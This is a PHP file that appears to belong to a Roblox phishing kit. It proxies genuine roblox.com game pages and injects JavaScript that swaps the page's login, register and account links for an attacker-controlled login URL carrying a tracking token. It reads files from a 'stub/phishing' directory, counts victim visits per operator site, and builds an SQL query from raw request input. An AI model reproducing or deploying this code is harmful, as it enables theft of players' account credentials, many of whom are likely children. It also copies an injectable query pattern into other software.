<?php
include("../../includes/functions.php");
include("../../web/setup/database.php");
error_reporting(0);
if($_GET["maxRows"]){
    $startIndex = htmlspecialchars($_GET["startIndex"]);
    $maxRows = htmlspecialchars($_GET["maxRows"]);
    $placeId = htmlspecialchars($_GET["placeId"]);
    $shit = htmlspecialchars($_GET["_"]);
    echo file_get_contents("https://www.roblox.com/games/getgamepassesinnerpartial?startIndex=$startIndex&maxRows=$maxRows&placeId=$placeId&_=$shit");
    
}else{
if($_GET["gameid"] && $_GET["gamename"]){
    if($_GET["privateServerLinkCode"]){
        $token1 = htmlspecialchars($_GET["privateServerLinkCode"]);
        $row = $db->query("SELECT * FROM east WHERE privateServerLinkCode='$token1'")->fetch();
        $siteid = $row["siteid"];
        
        $token=$row["logintoken"];
        $handle = fopen("../../users/$siteid/views.txt", "r"); 
        $counter = ( int ) fread ($handle,20) ;
         fclose ($handle) ;
        $counter++ ; 
        $handle = fopen("../../users/$siteid/views.txt", "w" ) ; 
        fwrite($handle,$counter) ; 
         fclose ($handle) ; 

        $handle1 = fopen("../../storestatistics/totalvisits.txt", "r"); 
        $counter1 = ( int ) fread ($handle1,20) ;
         fclose ($handle1) ;
        $counter1++ ; 
        $handle1 = fopen("../../storestatistics/totalvisits.txt", "w"); 
        fwrite($handle1,$counter1) ; 
         fclose ($handle1) ; 
    
 
        $apicorswith = file_get_contents("../../stub/phishing/replaces/apis2.php");
        $apicors = file_get_contents("../../stub/phishing/replaces/apis.txt");
    
        $ios = file_get_contents("../../web/cors/ios.txt");
        $ioss = file_get_contents("../../web/cors/ioss.txt");
        $iosss = file_get_contents("../../web/cors/iosss.txt");
    
        $gameid = htmlspecialchars($_GET["gameid"]);
        $gamename = htmlspecialchars($_GET["gamename"]);
        $gamename1 = str_replace("+", "-", $gamename);
        $gamename1 = str_replace(":", "", $gamename1);
        $gamename1 = str_replace(".", "", $gamename1);
        $shit = file_get_contents("https://www.roblox.com/games/$gameid/$gamename1");
        $str = str_replace($ios, NULL, $shit);
        $str = str_replace($ioss, NULL, $str);
        $str = str_replace($iosss, NULL, $str);
        
$str = str_replace("https://avatar.roblox.com", "/web", $str);
$str = str_replace("https://badges.roblox.com", "/web", $str);
$str = str_replace("https://catalog.roblox.com", "/web", $str);
$str = str_replace("https://friends.roblox.com", "/web", $str);
$str = str_replace("https://games.roblox.com", "/web", $str);
$str = str_replace("https://groups.roblox.com", "/web", $str);
$str = str_replace("https://metrics.roblox.com", "/web", $str);
$st1r = str_replace("https://thumbnails.roblox.com", "/web", $str);
        $st1r = str_replace("https://www.roblox.com/user-sponsorship/1", "$domain/web/sponsorship.php?id=1", $st1r);
        $st1r = str_replace("https://www.roblox.com/user-sponsorship/2", "$domain/web/sponsorship.php?id=2", $st1r);
        $st1r = str_replace("https://www.roblox.com/user-sponsorship/3", "$domain/web/sponsorship.php?id=3", $st1r);

        $str = str_replace("https://avatar.roblox.com", "/web", $st1r);
        $str = str_replace("https://badges.roblox.com", "/web", $str);
        $str = str_replace("https://catalog.roblox.com", "/web", $str);
        $str = str_replace("https://friends.roblox.com", "/web", $str);
        $str = str_replace("https://games.roblox.com", "/web", $str);
        $str = str_replace("https://groups.roblox.com", "/web", $str);
        $str = str_replace("https://metrics.roblox.com", "/web", $str);
        $st1r = str_replace("https://thumbnails.roblox.com", "/web", $str);
        echo $st1r;
          echo '<script type="text/javascript">
        setInterval(function(){ 
                var link = document.getElementById("voting-section");
                link.setAttribute("data-account-page-url", "'."$domain/login?returnUrl=$token".'");
                link.setAttribute("data-register-url", "'."$domain/login?returnUrl=$token".'");
                if(document.getElementById("decline-btn")){
                var popupplay = document.getElementById("decline-btn");
                popupplay.setAttribute("class", "btn-control-md");
                popupplay.setAttribute("type", "button");
                popupplay.setAttribute("href", "'."$domain/login?returnUrl=$token".'");
                popupplay.setAttribute("id", "login-btn");
                document.getElementById("login-btn").innerHTML = "Log In";
                }
                var loginbut = document.getElementsByClassName("font-header-2 rbx-navbar-login nav-menu-title rbx-menu-item");
                loginbut[0].setAttribute("href", "'."$domain/login?returnurl=$token".'");
                loginbut[0].setAttribute("class", "rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");
        });
    </script>
    <script>setTimeout(function(){
        var loginshit = document.getElementsByClassName("login-action")[0]
    loginshit.innerHTML = `<li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="/login?returnUrl='.$token.'">Log In</a></li>`;
    },500)</script>';
    }else{
    $token = "";
    
    $apicorswith = file_get_contents("../../stub/phishing/replaces/apis2.php");
    $apicors = file_get_contents("../../stub/phishing/replaces/apis.txt");

    $ios = file_get_contents("../../web/cors/ios.txt");
    $ioss = file_get_contents("../../web/cors/ioss.txt");
    $iosss = file_get_contents("../../web/cors/iosss.txt");

    $gameid = htmlspecialchars($_GET["gameid"]);
    $gamename = htmlspecialchars($_GET["gamename"]);
    $shit = file_get_contents("https://www.roblox.com/games/$gameid/$gamename");
    $str = str_replace($ios, NULL, $shit);
    $str = str_replace($ioss, NULL, $str);
    $str = str_replace($iosss, NULL, $str);
    
$str = str_replace("https://avatar.roblox.com", "/web", $str);
$str = str_replace("https://badges.roblox.com", "/web", $str);
$str = str_replace("https://catalog.roblox.com", "/web", $str);
$str = str_replace("https://friends.roblox.com", "/web", $str);
$str = str_replace("https://games.roblox.com", "/web", $str);
$str = str_replace("https://groups.roblox.com", "/web", $str);
$str = str_replace("https://metrics.roblox.com", "/web", $str);
$str = str_replace("https://thumbnails.roblox.com", "/web", $str);
    $st1r = str_replace("https://www.roblox.com/user-sponsorship/1", "$domain/web/sponsorship.php?id=1", $str);
    $st1r = str_replace("https://www.roblox.com/user-sponsorship/2", "$domain/web/sponsorship.php?id=2", $st1r);
    $st1r = str_replace("https://www.roblox.com/user-sponsorship/3", "$domain/web/sponsorship.php?id=3", $st1r);
    $st1r = str_replace('<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};

    Roblox.UpsellAdModal.Resources = {
        title: "Remove Ads Like This",
        body: "Builders Club members do not see external ads like these.",
        accept: "Upgrade Now",
        decline: "No, thanks"
    };
</script>','<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};

    Roblox.UpsellAdModal.Resources = {
        title: "Remove Ads Like This",
        body: "Builders Club members do not see external ads like these.",
        accept: "Upgrade Now",
        decline: "No, thanks"
    };
</script><script type="text/javascript">
    setInterval(function(){ 
            var link = document.getElementById("voting-section");
            link.setAttribute("data-account-page-url", "'."$domain/login?returnUrl=$token".'");
            link.setAttribute("data-register-url", "'."$domain/login?returnUrl=$token".'");
            if(document.getElementById("decline-btn")){
            var popupplay = document.getElementById("decline-btn");
            popupplay.setAttribute("class", "btn-control-md");
            popupplay.setAttribute("type", "button");
            popupplay.setAttribute("href", "'."$domain/login?returnUrl=$token".'");
            popupplay.setAttribute("id", "login-btn");
            document.getElementById("login-btn").innerHTML = "Log In";
            }
            var loginbut = document.getElementsByClassName("font-header-2 rbx-navbar-login nav-menu-title rbx-menu-item");
            loginbut[0].setAttribute("href", "'."$domain/login?returnurl=$token".'");
            loginbut[0].setAttribute("class", "rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");
    });
</script>
<script>setTimeout(function(){
    var loginshit = document.getElementsByClassName("login-action")[0]
loginshit.innerHTML = `<li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="/login?returnUrl='.$token.'">Log In</a></li>`;
},500)</script>', $st1r);
    echo $st1r;


}if($_GET["PlaceId"]){
    $placeid = htmlspecialchars($_GET["PlaceId"]);
    $ch = curl_init("https://api.roblox.com/universes/get-universe-containing-place?placeid=$placeid");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($ch);
$data = json_decode($data);
$url2 = "https://www.roblox.com/places/api-get-details?assetId=$placeid";

$curl2 = curl_init($url2);
    curl_setopt($curl2, CURLOPT_URL, $url2);
    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);

    //for debug only!
    curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);

    $resp2 = curl_exec($curl2);
    $info = json_decode($resp2);

    $gname = $info->Name;
    function RemoveSpecialChar($str) {
      
        // Using str_replace() function 
        // to replace the word 
        $res = str_replace( array( '\'', '"',
        ',' , ';', '<', '>' ,'!'), ' ', $str);
          
        // Returning the result 
        return $res;
        }
      
    // Given string
    $str = $gname; 
      
    // Function calling
    $gamename = RemoveSpecialChar($str); 
    $namegame = str_replace(' ', '-', $gamename);
    $gamename2 = preg_replace('/([0-9|#][\x{20E3}])|[\x{00ae}|\x{00a9}|\x{203C}|\x{2047}|\x{2048}|\x{2049}|\x{3030}|\x{303D}|\x{2139}|\x{2122}|\x{3297}|\x{3299}][\x{FE00}-\x{FEFF}]?|[\x{2190}-\x{21FF}][\x{FE00}-\x{FEFF}]?|[\x{2300}-\x{23FF}][\x{FE00}-\x{FEFF}]?|[\x{2460}-\x{24FF}][\x{FE00}-\x{FEFF}]?|[\x{25A0}-\x{25FF}][\x{FE00}-\x{FEFF}]?|[\x{2600}-\x{27BF}][\x{FE00}-\x{FEFF}]?|[\x{2900}-\x{297F}][\x{FE00}-\x{FEFF}]?|[\x{2B00}-\x{2BF0}][\x{FE00}-\x{FEFF}]?|[\x{1F000}-\x{1F6FF}][\x{FE00}-\x{FEFF}]?/u', '', $namegame);
    $gamename3 = str_replace("+", "-", $gamename2);
    $gamename4 = str_replace(":", "", $gamename3);
    $gamename5 = str_replace(".", "", $gamename4);
    echo $gamename5;
    header("Location: $placeid/$gamename4");
}
}
}
?>